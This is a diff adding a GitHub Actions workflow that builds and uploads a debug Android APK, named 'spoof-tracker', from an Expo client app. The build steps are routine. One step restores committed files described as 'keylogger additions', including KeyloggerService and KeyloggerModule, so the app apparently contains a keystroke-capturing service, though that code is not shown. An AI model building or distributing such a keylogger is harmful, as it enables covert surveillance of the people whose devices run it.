@@ -1,0 +1,92 @@
+name: Build Android APK
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'client-app/**'   # only rebuild when client-app changes
+  workflow_dispatch:       # also lets you trigger manually from GitHub UI
+
+jobs:
+  build-apk:
+    name: Build Debug APK
+    runs-on: ubuntu-latest
+
+    steps:
+      # ── 1. Checkout ────────────────────────────────────────────────
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # ── 2. Java 17 (required by Gradle / Android toolchain) ────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      # ── 3. Node.js ─────────────────────────────────────────────────
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+          cache-dependency-path: client-app/package-lock.json
+
+      # ── 4. Android SDK (pre-installed on ubuntu-latest, just need cmdline-tools) ──
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      # ── 5. Accept Android SDK licenses ─────────────────────────────
+      - name: Accept SDK licenses
+        run: yes | sdkmanager --licenses || true
+
+      # ── 6. Install npm dependencies ─────────────────────────────────
+      - name: Install dependencies
+        run: npm ci
+        working-directory: client-app
+
+      # ── 7. Run expo prebuild to regenerate android/ folder ─────────
+      #    (android/ is gitignored, so we regenerate it here;
+      #     then we overlay our custom Kotlin files from the repo)
+      - name: Expo prebuild (generates android/ folder)
+        run: npx expo prebuild --platform android --no-install
+        working-directory: client-app
+
+      # ── 8. Restore our custom native files (committed separately) ───
+      #    prebuild may overwrite MainApplication.kt and AndroidManifest.xml,
+      #    so we restore our versions from the committed files.
+      - name: Restore custom native files
+        run: |
+          # These files are committed in the repo with our keylogger additions
+          git checkout HEAD -- \
+            client-app/android/app/src/main/java/bits/personal/spoof/MainApplication.kt \
+            client-app/android/app/src/main/AndroidManifest.xml \
+            client-app/android/app/src/main/res/values/strings.xml \
+            client-app/android/app/src/main/res/xml/keylogger_service_config.xml \
+            client-app/android/app/src/main/java/bits/personal/spoof/keylogger/KeyloggerService.kt \
+            client-app/android/app/src/main/java/bits/personal/spoof/keylogger/KeyloggerModule.kt \
+            client-app/android/app/src/main/java/bits/personal/spoof/keylogger/KeyloggerPackage.kt
+
+      # ── 9. Make gradlew executable ──────────────────────────────────
+      - name: Make gradlew executable
+        run: chmod +x android/gradlew
+        working-directory: client-app
+
+      # ── 10. Build Debug APK ─────────────────────────────────────────
+      - name: Build Debug APK
+        run: ./gradlew assembleDebug --no-daemon
+        working-directory: client-app/android
+
+      # ── 11. Upload APK as artifact ──────────────────────────────────
+      - name: Upload APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: spoof-tracker-debug-${{ github.sha }}
+          path: client-app/android/app/build/outputs/apk/debug/app-debug.apk
+          retention-days: 30
+
+      # ── 12. Print download instructions ────────────────────────────
+      - name: Done!
+        run: |
+          echo "✅ APK built successfully!"
+          echo "Download it from: GitHub → Actions → this workflow run → Artifacts section"
